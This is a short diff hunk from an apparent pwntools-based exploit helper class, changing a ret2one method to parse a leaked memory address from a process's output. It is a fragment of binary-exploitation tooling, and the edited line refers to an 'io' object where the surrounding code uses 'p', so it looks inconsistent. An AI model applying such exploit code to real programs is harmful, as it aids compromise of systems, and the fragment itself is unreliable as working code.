@@ -119,7 +119,7 @@ class ROP:
     def ret2one(self, failed):
         payload = self.offset
         p = process(self.filename)
-        p.recvuntil(b": ")
+        given = int("0x"+io.recvuntil(b'>>>').decode('utf-8').split('0x')[1].split(' ')[0].strip('\n'),16)
         leak = p.recvline().decode('utf-8').strip()
         p.close()
 
